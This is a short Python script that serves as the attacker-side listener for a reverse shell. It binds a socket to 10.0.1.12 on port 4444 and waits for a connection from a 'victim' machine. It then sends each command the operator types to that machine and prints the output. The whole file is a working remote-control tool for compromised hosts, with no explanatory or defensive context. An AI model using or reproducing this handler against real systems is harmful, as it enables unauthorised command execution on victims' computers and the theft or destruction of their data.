import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.0.1.12",4444))  # set it as per your requirements
listener.listen(0)
print("[+]Waiting for incoming connections....")
connection,vic_address=listener.accept()
print("[+]Got a connection from"+str(vic_address))

while True:
    command = raw_input(">>")
    connection.send(command)
    result=connection.recv(1024)
    print(result)
